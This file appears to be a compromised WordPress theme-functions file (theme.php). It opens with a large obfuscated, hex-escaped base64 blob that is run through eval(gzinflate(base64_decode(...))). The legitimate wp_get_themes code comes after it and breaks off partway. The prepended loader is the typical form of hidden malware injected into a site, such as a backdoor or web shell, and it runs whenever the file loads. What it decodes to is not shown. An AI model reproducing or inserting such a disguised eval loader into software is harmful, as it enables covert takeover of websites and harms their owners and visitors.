bU27JFLvivr0LJEee\x41r\x438OhKk8\x615MThyESjweh5TLV0o4Ii\x43p0zr\x2bOFIr6YohHUFGiDvFgd7PL3HO7RMtr4x\x43LW\x631r0N3Qkm0M3pTY2DlZtX5E60DzmQqLvrFhZmo\x41pp9usHej4J0k5\x62TE\x61\x43mr\x2bN\x61WKnffXXY\x63YxmYMDt3yGTdVzW6FivKUdm\x411\x63x3\x2bsxWvE\x612yg1\x62\x62golY7dmX\x63Tgfy7KQf3XpkXOp9\x42UQ78R5gwpDOhzs\x413sLlVKIUHfUHtZfFS\x62SpQtnMdJ66mJxWSF0rdjsrER\x43nU2\x2b3OVFk23ivmi\x43\x61nWywe0OG2\x62oNi\x62sDJ2sD9qSloJXXtSYzNVftq\x62fvqRLfX1VFRjoNXlWx\x61U\x2b\x61WsKMRsWd\x63RDE\x62DVlVxwUzF2Uf1iioZsF\x42PQwrVw\x43F73S1gEqZN7UJrI\x62J2MuFVFSMsizRUHh\x61zQexYZPIUtp4K\x43IS\x63EHNZDFYrvpVN8\x43Lv\x419s50fFF\x621\x418Ni\x414WH\x626jEZwpp\x62hZEQv\x61IxWpZV0IMzWKUhx52\x2b3\x2bk7\x43DRUoUOPMrmll6n\x43yHI\x43leMZMk6eJhJv\x41GGk\x42rTW\x2be2rlTtYNmOiSde0FFT8iRkXM1/unQUxjOHl70s\x43xFxOQ\x63Ss\x42Ur0\x43s8yIfT3uREZvl0m\x2bLwf0pVrNjQ\x41mFO3vTU6fXKtrwiLXlWdwslLRHLn\x61K2WWqf\x61uo0z\x41d\x418QZTqqiLRpe\x43KZNUYNvE2\x63W8O\x42X\x62IhTj\x43o\x42\x43m\x63s71LJ9vlhe7\x63oX31DsppMq5zh\x43viNoKLxSD\x2bnRKQfrwg/QynVKyUX4\x2bn\x41yDlvJY3ukpGL\x63i9\x639Y41GpKQIZ0eyrZ9U/Twz09PyTSOWpwXyK8hl\x41Y\x61992rkdSr2y4POSSR8Sh\x416VHvvF4Mdgw4LWlqmKpUulKZ/3HZKxfhUMojJ\x61rh\x2bfF/9VNOox2dXowGfDq1x\x436GDZQ\x61KghKQ0qoxM0zmgHXe/N\x2bmV\x43ZEGhPH/P\x42L76\x2bpwG\x43GzPDE\x63FPRhs2G\x43Z4\x430g3zd/\x638KJ\x41vun6Ut\x41KsTZ0\x62MMXkod1mPQD\x62\x614WfM\x2bdGEgL0Y8\x42nu413TW0unzUy\x41DF9F8dIl\x610Dd9iKhil\x639Knu\x2bu\x2bVfkqSin6Hx/P5ZxW6qTE/\x43F/ETH\x43XtH4ffzRmJm\x2bEpOGOpjQjQQPfStP0ZFpUed/F/99UPzyfEw\x2bwnWi7nVjgsZ\x61Gg\x43DNd0\x612\x43fO93v4F95g2\x2bDz/JhyhZRY9guF5nH3\x42LnXLPwHnpo5ktREVourNjkTthn5Ylz\x62iwiHwFyTf\x42MWug\x2bhmMLKnvL\x42N\x619n\x42rIXypiG\x637R/ZgKD35T\x42W\x43MhDwRJ75oh9m0wGE0\x616Xv\x41P\x2b9P\x42TsmTWS\x41q\x2bvDdTjfve9ny5kgSpK5xXpEhQ3kUQ\x63Ky15QF\x62u5Qiq9\x4203n\x63QOrUHo7JoK0\x2b\x41/mkr9jSpL3\x436uGX74OthFE9y/pjex\x41Gmy2\x41h5\x437mpqnIXM2mJj/eg8m/I5\x63\x62/WODIlsgNGYY\x61\x62wq119ijq\x426D\x62SIZ\x2bN7/yJG\x2bimhtwqoI\x42q1Xtd\x41Ksd4\x2bwD\x41ED\x2bE\x61y4sZPz2NmE3NI\x61VquRIxkoSDhRTikHyOM2KpVFQLJEnmF3YT4\x63oOIESXKNe0tg6VGiJk\x63x4U0LEQVY/SM8JGYW8SV\x437sDyWLVzwT\x630OWTN\x42Sm\x63iOk0\x42EhKil\x63ZZJ\x61P\x62KxMx2Ov\x43GgRG\x63SI4VRfR\x2bWZnJkks\x43\x62jR1m4m\x43jk4HF\x41sUx\x41RmKR8Tkk\x62V6dkW\x2blTkMZ/U5FiHkHmMkUYIS\x61\x429fIYHVSOgRLeVVOenyQJSZu3D1QW5WG8nqkeDwWEPXPLevQnMIdkEy4uKY\x61oN9GuS\x43WX\x63iSh\x42LGx0FMDMXmq6TIiRXDE6inq\x62RyHKVfdWS\x422QQwz3\x430UpJ5\x2blLDmk0\x636wU6xLSK\x415G\x41\x41N5TU0ksEnZiwtIpRg5K\x61Rg\x63KEJ9mG7q5UYxIOZD/EfWfN\x2b\x2b\x41ZOGE3\x2btT/nI\x43\x434FPMDiOIR6F\x61Nxvg\x2b\x62fw0Npx\x420EdhQfh2VthKlp\x2byt\x42Ge6lzHqedJizQ9\x61fZTk\x41NTTVFzqkWYWMdNfV4MIDfzq7/PuXM8dpz\x43\x42I\x2bGQ\x2bjGKTDVmZ\x4252eIVeqv\x61V8iQXeq2ZYnwtm6nNGRpmoR0\x619yI3mlT/\x42Xgtl\x63hN15uom/fYHy\x61/hh9\x63NOl2M/VM\x43lF1D\x2bi\x62duk5zDOWSuDyjiyY\x61kgnGsGY\x625\x438DEGdOh\x42QMUYPlOu\x63koo95ItS\x425\x621nxXF/p7FJ\x2bpl0e8TIRL8H\x63yKi1kRy5f\x62f\x62DjYvdIZRE\x62\x61lZGuUzGWu/lnXKZ7uP/i\x2b1ZLQRnt\x42X8dOM\x43f3\x43n8rPjyPX\x63Y2LGZ\x63P\x43\x61Xo5\x41QK\x61t97GX8ZH\x629gRXGEnZD\x62Eq\x43\x63Jf6SZP0/TiUR/iE65QZRltVfdr0mFVHED0oNmElnoemd0UEMuM2ZeOWx\x63X6pRt\x63\x623M\x417\x61xwYwMTOwvKDfkiohQjI6WKFQtJu3Hu4sq\x61\x63FwNTn\x43Q1\x437dXhH\x61OOgR\x62QJp1pEoF\x61x\x62H1s0ikPRPLlmYdF5FI0osp\x42OKLt\x42qgIt8\x63WwDd\x61y\x41DNnDr9ZY3mNIyU/dgw\x61osIF/w\x41PE\x41QQv\x2bsY\x63\x43hWT\x430yg9\x423vGRN5J2vf3\x42MEi7q\x41tNSP/FIGH4vZ8g\x41kTs29P\x41ZEsjgv\x427ltN\x42\x2bDw7kt\x629YjGM\x62G0\x43MMj2S\x431FoJRWFgmuTn3VQtOtYnum\x2b2wkExMoURfui\x62lRe7oPr\x41gnH6gdHWGgzIw5eq\x2beO0nRVygIMPywpP\x61Uv00vgZTy4uX5zm1EnYYhOiJP0SnJ\x42L\x42\x615/518RnzMs\x41hs\x62\x616F\x2bYlLR7\x61I\x62wY\x439D\x61o\x41RDFy\x2bOdLMJ\x41KGqdd7OZdUwF/YlpwY2lEWF\x43Y2RYNQ9\x6201LN6qo2eQ\x62vIf1eJ\x2b\x61YfhMmg/576EiHUf7\x62L\x43\x61\x43Ed7u0Huv954HVEX\x41\x2bG\x621nFgQrLPDs\x425\x43u\x62v\x63EoU1\x431uQVu\x4304oYIQ9QTmFo\x63UW\x43HE2MfJg3JmOyZnJ6O\x2b3LzN0U1GKY2STDFu\x42\x61g2UFrOgjPP\x2b1Sug\x2b88XS8E99KGQ/\x43UUHyx\x41I6\x41uSIi\x62\x63n\x43ITuy\x43rPS2nmRnJilS63NV\x63RKLiKGnt09IS\x63z82qoT/h\x2b8M4\x63\x2bu\x42\x41SKWqsgGixHhVmuIHd5ltxItrz2M0i80/Pplwo9j8O\x42xHHJT\x61d4uFnv4nY\x2bwLQofzW\x42gvxPegF\x63M9Hw\x2bU\x43/Nh\x43\x2buTIv2PI/\x41Q9P3dY\x43xkrsG\x2bEjpVsYJXTrwy\x437L6HVW\x61ygNUI9Iuw09S\x43HDx7s4Zpsg5Mj\x63s\x42QG/P\x43j\x2bnSMgF\x63iPgHyM76W\x2bL4Ehj1ETg\x43wP2sh/nghU\x426N\x41VfN2lEZ8hxWDRzmshGezHLgQk\x41Fd\x41TvvgIyI8Pgqm60O0OE\x41D02MQEoSD\x62\x628u3zZ6uNPgqTTeXop\x41s/q\x435Z\x2by4\x42HoDzQutDEyooJE//0gd\x2bMyXjN\x61ltKE\x42\x42\x424Nwgr9OYywjmK\x2b\x62w5\x42\x2b2qTgsZo6msv\x631i\x433LZ7\x42Q\x63si\x43\x61ml7k\x43n\x2bMV4rWFL\x62w\x61S\x62x51mD\x2b9FZe5W3\x614mOX\x63HmVN6Y\x4320R1\x415TmtD3R7OR\x61InzPq6x\x61r1o1NkwooNz\x43\x61mtN1\x42n\x2bgU\x62\x41NfwXXRiiVMq63\x4213\x41GNsPd\x62\x439Oyu\x41lH1M48\x62juIDSPY7kXQuvvwz32yX\x43SM0sep9vTJQ84\x63s7\x43lDpv3V\x42DO2p\x42V\x62h\x42fwm\x438n\x62zghQ1hLvdr3i\x622d\x2bufSg5\x43dEzp\x427H2NY\x62\x2bgo\x42ny8dN38k/iKo\x61Y\x615O7\x42kI\x43gErNg5LsSqIDjp3DRJVOp\x42mJQH1Yv\x42\x62z\x42S86sfpd3EEi\x41\x2b\x63lnJlxq\x6341nO\x41Wq5\x42\x2b3gS\x439z\x420Y\x426\x43dLHz1M0PQzHUZlWpdXvfDwH0D\x417J2q\x42IrY/MXHPqw\x2bZ\x42G\x41ImtHUkU10Luv\x61EpWfxJ\x61Z7zM8q1\x635zK1XkV\x2bKZ1RzvpKV6KtjZsfoIRRVyvtEPEFrFUQ8wteWP0nDu2zEpQoqIm7NLjt\x41RVwVirI3\x43gemuk\x43VwGt1u\x61vFxMNOkMv14lSYsd2WIyY\x43\x63vt6\x43\x63KSmHm\x42d\x62EFW\x62\x41wK\x2bI7s8Xfn\x42yS\x618FOkTIOo7K\x63UFe\x439\x63drH66l\x2bK5UJFQJYH\x42KT\x43f1dGy\x41thtkqI42sQ9diY/R\x63s6wZdQ\x2b\x41ZHUg\x2bzWPWEh5hnuh\x62EreD3mOpRfYX\x2b1q\x424Kun5GQ7EIjO\x63IgU2eiifopi9deKlwuhPX\x43\x41q\x2b\x41\x61mOkd5JsEDm\x630N8\x41Dq6IEtQHMDsdoMg\x2bufOHpf2\x63623PTUx\x62u\x41f5g56nPRsLzGdU\x42\x63jRS4sD2vhjfd\x62iMH5PoNeJ\x620Fvu/P4vpZ7N\x43OijYt5\x62\x41O\x62\x41s9vwned\x41inm\x61\x617LzkVX6XYpO/E59lr\x6277KQsmIQZiq/Ug5SsfeW0v2pNSK0zrrtkt82\x61Un6Pxn\x42n9eKoErKOwqe\x42\x2bnOXUM2TO2dxZrK\x42/1H\x41hx\x42OgdtqJw\x632GWt\x43YH\x2bwdw\x41/qq7nd7Y/wFGhdyOVml4EgRYYq\x43SdtkoVjhZWfk0VPpgLLw\x61MQpX5L4Z4wVH376hN\x62grO\x63g0o\x63mYr\x42\x62N5Gy7VII2Eg\x43\x62N4ujEwd0t6D5w5M\x63MkR\x41sjvnXO\x2bSU\x439qEpV478wMYjeYGijnm45Dg3mXgMptp\x41u\x41gmhmM\x41nNxx\x427N\x42\x61hFImIxWvloiHp\x41TV\x41yXE1\x43R4\x2bEHf\x62i0x1R59Ly\x41j41S\x41kt0SgJU83g\x63WpO\x62\x43TfQQ\x43grGEnHr2HR5R89TLOSP7yRvOxdj16PQY\x62Gi5O6o\x41g33\x42D\x42VYY9ZL\x61uIfM4QxDz2DilJ\x42J\x62Mxpd\x42JY8jz\x42\x43wyQViZxk\x42HMQ4iuJEe\x41EQQ\x43Fw\x61\x414xx3\x63wh\x6170kgZ0R\x41GY7rM\x42xOloVEjGfE8tXIQkynO\x41Fwkujiinm4\x42UPe2Y\x63xk4HP\x42pN9YUes4TpYjDZRM0XN8\x2bQlmW9tzJm\x61w\x63g\x42yZsiOw5\x419F\x41gRuz6\x417\x42fHHeQMWk5zkeD4OKhq0mNNf0EqhWIP\x41wX49Rk\x61ZEh5KxTI\x42s\x62MGo\x42wDi01M4qQUH1\x62Fp\x619zh0iHH0Ky70y\x41\x43Z\x2bRf7Xd\x41mSyjeK\x43Kg48O\x41PQPS0S\x63PPGgZ3p\x41Wh6DZ\x62S8\x61djiXnfw5D0PS5PQ1nWUD0\x41\x42\x41mH0dYy\x419HIM9TOeMK\x63LxiMV7OmnZ1RglvUj5Ow9Rm\x2bNYPOW9\x63\x41dE\x62JJ9\x41\x614ni3\x41P\x42eOYWUo0zhy4rNY/ZXMonzThnZ\x41J\x41mIQ\x617wp6hVHpoXHK\x42DeFglGsk6\x2b8SwL8gZw3\x41xEn/\x634nf44i1ES\x41/goykJZ/q\x42XwRDo3dUx/9ZkQj\x41\x42O71DwM\x429evIh7I\x41i9DN\x2bmZ\x61WyDXt5y5ry\x63N\x41Xj\x43\x420Op4\x2bRTKj8DeqPvE0M\x62ONw\x62XykFdqz7KzVyzqo\x616vdxuomuKSnD\x61R\x2bnSi4Xeo8Tv5Lr3HtP\x42IN/Qv\x427JJYzdY/\x62\x2b\x61g9K5gUe\x61d00xiN6fD0gHQvhNGgN\x41OtWg\x434sNz04\x41SfmUSDOq55\x41Sj0\x423u9l5qexx8/\x2blxZ0ysGKl\x41dEy1\x63Z\x62QHToH4\x41SnNKDeS2W\x62\x41P\x428VPNIGgHU9uDMvE\x41v\x42wJQ\x42mfgt\x41P\x2bwplJ7h\x61HweDM\x63ls\x2bwpD9qKYWR\x417d\x2bn1L8mfml6/\x2bom9\x42N1\x2b\x63T0L\x2bUFQs7kvsZ\x41XZXOIEMX\x42sO2U\x41\x6180X4IhOQH\x62KDu/hTj\x43P\x63h915XdF\x2bHIUVg9MQ\x62sNiZN\x416XXFnd\x2bMQgt2NpfDSO6QnEjP47zQ\x414F\x63504jeHH0Z/6HWEY\x41wIu\x41YP5l\x2b\x43KRZQrQW59E5F\x42W9\x43Ymh\x42jqIw\x62\x422hNLoHNw9WmG\x41\x2bD\x42Yi\x434dqEU3Do\x41Q451hfPLD6YG9q\x42s5OWJOZZGj59\x41HXhFt6\x41MGP73OtX1gd9\x43s6TT\x63KE8\x629KXZUI2UL1\x6140kRh9PZXODG1\x43ZyGw86y0MdP7\x2bGEDgOIH\x417Fz855OFvVI\x42ns\x63\x62W\x42M6z0\x41mXkwN/wmMwdY2F\x61w\x2b6yf\x426ys\x424vgOjntK\x43s7Q8wtpqUG\x41VY3nw90ll5\x61xy6snp9QeLW8\x62lprtRZwvV6ol0m\x42p61\x63Z/73m\x41p\x63ZXvPU\x62\x42k\x629M\x63WzwLUKmwYQ\x63N3X8P7m\x42f\x424Nj\x61\x41gZs\x2bwN1sVG8FMP6\x41NDlpFEk6\x41\x63df\x62Et\x41e8R7uVjffw\x2bLw\x41kj53Z\x61eonjj6\x42f5gxgS\x6306MfvLOY2z\x2b3XmfowuHo\x42g\x63\x2bvjyF77ex\x42M\x41KFIQ\x2boVY/54tH/Ff0n\x2b8H4\x61Gtv\x63TtkujZ\x41\x41TvP\x42\x43Quw\x416V7y11Kp9/nzfq/Vz3WPz9sT\x63gGIDw/\x61lfowi70O8Pw3\x61hv4T/gt4x07X/4Dopp3Jq\x62guJxjo/O93\x63u\x2b94zRQq\x63\x42Hd1iFe\x427Gn/\x62YMIGtywzn/LPy27g9st6dP37DOF\x42\x2brqI\x43Ydd0nz7T\x62Z6r\x62Z\x61kHvQiy\x2bDRuK9vG7PVSK/\x62\x42vDgozQ\x63kP618o4iH\x62n9vYP6mmukvoL\x42rfPZ\x61muF7ZnX/sV\x62G6usn77dPTWsDs3p9/GMdf6Oi1\x61yeIGk7IV8j3i/\x621i63\x61eqV7Hq/p20/pwxI\x2brkD\x62O6\x2bS8l7o2E\x2bnDZ\x622ff\x42/8f\x62r\x42SPNXu\x2b4T1SmqeEMG/tE\x61TpPHye\x43sZE\x61kpHP8lxeyQ3j2pY2z\x61ES/\x63\x41tlZv5\x61OF0ps2dhit96GQz\x62xyiU67FJ7iQw\x421m\x2bxZMX\x41\x626SGt/\x63\x42\x42PsFkhqlfOQtgW\x41NfoNlRPS\x63HYokFvUuMJmIGQd80m8eLpmz9Opjiux6SG5nJq8u\x43xGF/u017EdeuSw\x41uI\x42uUZ\x42g50p4R2mzuRtPR/tEDm0h8ZXUs6woe3JS/y\x62\x41ug1JmfF\x2bPSwo4\x420Yvnl\x2b8T9627hW3qunx3I/j55jy\x421D\x2bZVFwj563p7ZYOTioPhRe4FXJlRHgk27yI9\x42SjpQITPH5DD0OMX2/HtvFNd\x43yOEpMp3LQI\x61fqg2EYKiPzPUO/vSqMF7j\x4392P0v\x43PsiQ\x434TMj\x2bXL0uh8g4riltY\x2bumpm3w8yQSI\x2btiJPTvOHdkxQDd\x42oR\x43WDYOL9tgPo0DGmE8\x417NGSkK8xDi7Mn8\x62TWd\x42If\x2bwimh\x41/\x2bV\x427DHy\x2bRq8e\x41fWI5Z\x63k\x425/7UhKqGJJ4jPhm9NOyoWnkOh9wqyny4pJMtvxsGh1vK7gZ493y2fEOTTz2N\x623mT\x61KReNNPfZn2Hff9\x2bD7/fGZff/8TS\x2bnXnsMk\x63\x62L8i88V\x63V\x63MVzlIiMfURiz1mJgnKI/UJ\x42wHI\x62uvmGiG0MF8YJWEVjrRliVTDRIgm59/P//19/f//r7f0/dI/vI//H/xl\x41r\x61rQ9KYs\x41rUuo4pz\x2bZdlkqVIZvkZ\x61sDtsf\x2bGF\x62zJyGGvh4DEpzQ6HvF2TMnj6W\x43\x62vDGymLWyK98sPhiIS4YQzP\x625I4jGHN\x2biekv4/3TfGvJeHgR2q/P\x2bpN\x63hxmFG9M3sZGzpgGJTEO\x43GknRPi\x426l7jHLlOMw82yP5w9\x61g/DOVp7w7fXK5nux9YSpGO4LGD4vOIITJM0Dg\x2bwxr/IsiZSn8Y4Q9ur\x621UjGuxYQfMeiMHnd\x42DzwsKr\x62l1XOe4DvT4uWFWITqTKGgS\x61nrZUvM8vH9u9/97g9dQO7iDdD7gN8x1pJi9nz7H2rYkni\x42uX\x2bhTw3\x63inqsS3jTVnnQE\x2bveP\x62Q\x42g3OQ/tGWD\x61fnt\x625u\x41STsJNGU\x41q4\x2bYngM\x43V6Yi8p\x63pwjhqEul\x41M5\x62z\x411oy\x42sO8ZmGmJfRVTS2xJMNnfI/KQxZgW7wXo6D04iyy8KDrnP\x2bN6SD\x62Z\x42\x63oGm0p/P9\x6107zvG5JrzS770oIrTem25jef\x2b\x2b92o3nPvxujP4zR0jef//dkK\x42SD\x41new580Go\x43X6XXSOKKEPR\x2bUUQR\x41qJ\x63x\x43\x42vJRkiNpjjFt\x2bgPse1T8NrvJJ\x62lSPEUU/7YQ\x63RjD\x43y8DxVL\x63ST\x2b5xqg\x61MHdKlTO8W\x43vEXSN\x2bhxX88f89jHThV9Hi\x42e/Q\x61kTxUNYo0S\x62oGRJf2ivkN7y/Lp\x63sRg\x63\x61xLdDXn\x42neeovY9\x62Ov\x63mmozDM2/dFLthKd\x63kP\x42ehzyNUGUJ89\x2b/V//v4/v9//8\x2b/Z\x2b/P//P6/X1//8//y\x2bYhP42XT048h\x41Qe1/1Ep\x2b\x2bh99\x41K319z/\x2bNQvf6Sse\x2bH9PfRzp\x43iW21X\x61Y\x2b926oLfrFM\x63JI/5rD\x2bWDe/GIXdHoPq2DUddz97XmQ0ZfkTyjW6INvtl8EJwxXXup\x61\x63/UeYiOxd\x624z\x62HZi\x4233T\x2b5xIkUJgkW\x42x\x42\x42ge\x617\x2bXgY6H\x62wSd4lIUH3P\x41\x43iRpsO4K03f66jeZuVf\x2bV5xNi9we8Pl\x41Vg/Sr\x42\x41zQ/I57sHwE2evIRVVDdH0P6\x43Dj0Qoj1/xo7/vmP8\x61Y2g4j/WzjX\x41S\x61TEt7HrDE/YRHF8ZfgP2/7LF\x62\x41h\x61r\x63f77\x41/J\x61\x2b\x62ZY\x63R\x2bPgSthxQFsxjNw28pjePHPe053p\x41/Se4fU0jzuxx9ODRxHp4h/t1KiX0QY04jD0EFP\x2b18vf//EdM//S8R\x62fWSipS\x41LVi8oOqx7iDvMV\x2bFLxmUOMDGkxrT2gn\x2b\x2bYjxESYQmv\x43\x43EDk2KVef\x41T\x43ndJmd/73duUv5v1l\x61xvFWTZel66/qE5WL\x41KU0g\x61zHZfpi7SH807xjW/sO8i\x61g\x61Ujrrv\x2bYyYf/9Kzf4vvf\x42PGPq\x41hw0ER7kd89zD2KZIgDhYX\x62f8pYjptNjX2Dy\x638wq8GOwQqjpM\x41Pe0HXvYpe\x61dvwINqKYVr/\x2b6u27PP/u\x2b\x2b\x2b9T567znv\x2b8gVqxr2X79/5R1\x2b\x2b2uo3ffKph96hDW\x41VxpZ5j\x2boYPoo36U\x61r7EDgv0tg\x61Sm8FF\x2bsT84ZL/4En4\x41H\x63q\x41EL\x2b2fHYs41zurQXGSyie\x61LERjfvI6xsO2IG96ZR43\x2bJ9/z4mSxz7DQex\x626n\x62y\x62\x62YP\x42tt\x63DxDYiGo7P\x63NUjHpwLO0\x43tvrsPW0nXYoNHKtEd\x2bo\x62KjoD3\x61\x622LgSJ\x62LoO7tUew\x617\x62Hf\x41dR6\x2b/x/E920RFI7vldv2\x43Ef\x43iLjq\x2bz1gr917q9peo1tk9L3yVPJE4If08HQ6L0\x41WmUx8F0/vpoYVIRSVIW0QJ6eyTU3\x42JEm\x42do1xofYj7OIf\x41dxVy24GOJf0pf5fIzmoFTnJ99dK3qtTzEtFF1MK2w5Owp6gGs2f6\x43VF\x41oq\x427RSFLZf\x42hYM\x2bzOJ82qzDZKM\x61g\x62HzZ8DsEf3FGszown\x42gGvMfMuX4I\x42wN2QxQ\x2b3odRP183l9\x41\x2bRw\x61\x61D\x63xn/oO\x2beJzeQnKvtUHGexw\x62SgP7USEduH6\x41\x63juzNpYvdXX\x4357TynRRHlZ1rJP1ZZy0\x63N\x432gexHhU\x2bvWlzzoY55YL\x2bv2z2VI\x41mZZ83T7wPZvWK5\x41MKxV08RzLo2QVeXdrrIDH2I\x2b4S6Gj0gqW/\x63\x62\x41pQkZxeZ9swIeg4QXi7iNVR8HFN\x63Vsmq3sZH\x626lhFIzKthJi9O2g58MZ/YQhwt9P\x43yf\x41r6p3nZKw\x430D8/jty\x42P7Rxh999\x62q2xX7GkTfZZ3\x425Gsk8O5lwWEk\x43R2W8L\x62fgO\x61wzR/FzS9oVf3333X0E1zjf\x634lulORNP\x42d83eU\x2b60HgZyoO0Z\x62pN\x62LPf\x42e5tk4POL8\x42yG\x63oWHzdwX/hJ9yTfF0nD9y\x627Jx/\x42Gz3TuqjN6\x42f\x63WUIFe0K4XJ/Ds3QOF4tfPZ6O20Lqzw\x43E0m\x2bMO0Hv1vvr4ivxXj/61UDwKQUtjfLRJ\x41\x42QViFEwXzqf\x42KgqdqD7x3\x625\x62FI19thwp\x61\x42\x63xvJtR4Rqmv\x41vhkeHwNo2oDLh3hxg62MJK0u4YDJ\x41gj0\x42KQ\x61txHPgIiL6f9FUo\x63Wd0voMIV\x41XZrn7\x43UYg2Fp/\x424pP8gvF\x62xT\x613\x2b6hINs5WzS6G\x61W\x418LQGt\x61erPKO\x42JRKRpOxvFO\x62Z/LQ2\x2bq7\x61Z\x43y8LN9\x41\x62QD\x42\x61tOp/jT\x43gZpOUEz15/QYT6\x63n9JxjrVl1mOi1PRd1N5z5kxwwGk\x42LNnRq87\x42qgkpN4ju3\x61OG3M8D\x43sIsngh8ffyDdpV8X\x426KnyZh62Ud7IZ2yYN\x2bZJuS\x41fQg36JQO3z\x622Hr9iPWP6P72xE9MoE5ZiXf0jNhL\x62gqFSIxX2nm\x635o\x62LsuY/QIFugLYXYT2qHf2MM0yKp\x42zsSt4Rfqj4kgOpjN\x43VGHjxZmeEH/Y\x2b3\x43/2Jf8QyPNprO/97Lme6v59Fx6i8x1r9593Zn\x61ShWT//J83jjeH/fK7yosd713\x2b/vt\x2bPy/p3Y3VW6wT5/z5/P5z73xPsFk/qyK3v\x2b83tZ7lnd6nYxn/P/lZj23fvw3u6xP9l3q\x2b945rPOx56/x3vi/6ZS/d/rtf7xrFX6\x2b3ZPM5De2X91Ke487/zs/PPf\x2bl6/xKX\x2b50f7pJd/t1uhf1VP/\x633sL7XRv\x2b8587j9TP6t\x2buhOpW\x63\x2bxdxrH9Tkndx4z/xW/\x435\x42z6zHfqjvs1JIQoXXJH\x416MG2pZR4\x41\x62KX\x43\x43qLu\x617\x61\x41d2\x63Df\x2b\x63/G\x2bQJ8huRtZnrurjl\x41Es35\x42x\x41Eg\x616M\x2b6FDghg10N\x41\x2bimlJ\x2b\x63IKuMgk6\x63O4DK4dRZ0x2PLp\x42wf\x62h\x439wz3YkmPIJr5T3iF5d\x61jegR7RDklq\x43YV\x62X\x43lpZ4D4I2dqwvUM7ZUXXd3wk3F2GLv0ltegPjeGoMWt0tyRS24iQeSL1U4G7\x42MZFsd/\x62ZxFXtFW\x43gGFlsd5vHQHi0vqIU4Y\x43SeNZEW\x63Mo\x62R7zPPhD\x62\x63Lj7YN\x41\x43J0e/2r\x61DjzyWws5oHs8\x61LyDfeD9qZIFzgs4pSkFj3wV\x2b\x41z6TDskW0o3JSkXtT3lf/\x2be0JLOgyG3Rn\x63N62T/wtwxv3Ed0Gx\x41K\x41Hq\x439w2hRXg78MuRY6l0PSz/4wPUo\x42GLeEVyoTvwOEj\x61zYm3\x637RsGFpYxPKR\x41qstkN8jFh/I\x62iO8T/IL\x62P61y//X\x62Qkj/8EQjzonResyyw06o\x43T1hzkn6PkS4o9JM\x61vZ0KQWjeNJzuIMZjmnf5UqmlsO5Nd5j3\x63n\x2bp\x43W\x43rQP6l1JFv1Rh\x42xLtrEESyDxQ3Q6X5kEPljXzyKIIMexUq1ZYOSiGhRqYfsrduW\x61VtKM\x43M\x62i6U9sN\x41SDQpegoks5VDT2mj\x42O2Fh\x61\x62Qy6zDkHm\x61\x62klW\x42Z1y\x61kkN8f\x42xOPolN5VWGUl\x62JdruWoOpWKm\x41P8gqMtpd93\x43zD\x633DuT4Mf7y8ELDPRQWEHR\x63G2kuVq\x425N5L8UwwnuZR3Di\x2bKkth\x61qX6XN\x41vY\x432\x622\x619jGqDdi\x43tDJZ\x2bSO5WQ0Fy0M\x43TW0\x2bIDWEnRMzS0n6ZXNQ2w7REgmhzfYs2otPkJZxS6noWW8E/q0ysfMIMS7iV4mwJNzrNhWQ22VjO0oE\x2bu\x61fjxZYWsm6l1gM/Tfk\x2b5WE3\x62Z7o0/09Wj3oHf2IK\x43zkttNRj6M8\x2bN90hykGEioTvfftNRlu4hP5yIhPWPO\x2bgG4\x41\x62x\x42ng332d6qv\x2b4jv56zT\x63W\x2b4Tn\x43ZZrTYHz1HG8t\x2bj16Mvlto4d9lnuYNvf\x2bz85P\x639693hw//j47/7Hy/fXD//Pyvf98\x42EpNNywGkFOG9Pf8168//ff92FHud4f\x63Yy5zf89x3vnte2Zrv\x2bwh/fojf\x61Xf\x41kx9xj\x2bDh4K6T3Q\x2b/jw//j0LX07G\x2b/4iHe7hLe4REeGh\x41Juq\x2b0Z\x62PV\x41PD\x41\x43\x43kI\x4184d\x2bEz9nlz1\x62Xz6/2WYfI37L7\x62z21sYn\x62\x62Z\x2bEMESSEkpMFI\x42\x41GjO\x616spQ1npu0dWVlS5UlOqXNWngPmRopS3emJDw\x622P\x2bN\x43oIJS\x62LZ39z\x2bfy\x43YT\x41wJe/JLgN\x42wfv\x43IU\x41wJe/5KgR\x42wfs\x434U\x41wJe/xKgT\x42wfm\x43YW\x41wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>
<?php
/**
 * Theme, template, and stylesheet functions.
 *
 * @package WordPress
 * @subpackage Theme
 */

/**
 * Returns an array of WP_Theme objects based on the arguments.
 *
 * Despite advances over get_themes(), this function is quite expensive, and grows
 * linearly with additional themes. Stick to wp_get_theme() if possible.
 *
 * @since 3.4.0
 *
 * @global array $wp_theme_directories
 *
 * @param array $args {
 *     Optional. The search arguments.
 *
 *     @type mixed $errors  True to return themes with errors, false to return
 *                          themes without errors, null to return all themes.
 *                          Default false.
 *     @type mixed $allowed (Multisite) True to return only allowed themes for a site.
 *                          False to return only disallowed themes for a site.
 *                          'site' to return only site-allowed themes.
 *                          'network' to return only network-allowed themes.
 *                          Null to return all themes. Default null.
 *     @type int   $blog_id (Multisite) The blog ID used to calculate which themes
 *                          are allowed. Default 0, synonymous for the current blog.
 * }
 * @return WP_Theme[] Array of WP_Theme objects.
 */
function wp_get_themes( $args = array() ) {
	global $wp_theme_directories;

	$defaults = array(
		'errors'  => false,
		'allowed' => null,
		'blog_id' => 0,
	);
	$args     = wp_parse_args( $args, $defaults );

	$theme_directories = search_theme_directories();

	if ( is_array( $wp_theme_directories ) && count( $wp_theme_directories ) > 1 ) {
		/*
		 * Make sure the active theme wins out, in case search_theme_directories() picks the wrong
		 * one in the case of a conflict. (Normally, last registered theme root wins.)
		 */
		$current_theme = get_stylesheet();
		if ( isset( $theme_directories[ $current_theme ] ) ) {
			$root_of_current_theme = get_raw_theme_root( $current_theme );
			if ( ! in_array( $root_of_current_theme, $wp_theme_directories, true ) ) {
				$root_of_current_theme = WP_CONTENT_DIR . $root_of_current_theme;
			}
			$theme_directories[ $current_theme ]['theme_root'] = $root_of_current_theme;
		}
	}

	if ( empty( $theme_directories ) ) {
		return array();
	}

	if ( is_multisite() && null !== $args['allowed'] ) {
		$allowed = $args['allowed'];
		if ( 'network' === $allowed ) {
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed_on_network() );
		} elseif ( 'site' === $allowed ) {
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed_on_site( $args['blog_id'] ) );
		} elseif ( $allowed ) {
			$theme_directories = array_intersect_key( $theme_directories, WP_Theme::get_allowed( $args['blog_id'] ) );
		} else {
			$theme_directories = array_diff_key( $theme_directories, WP_Theme::get_allowed( $args['blog_id'] ) );
		}
	}

	$themes         = array();
	static $_themes = array();

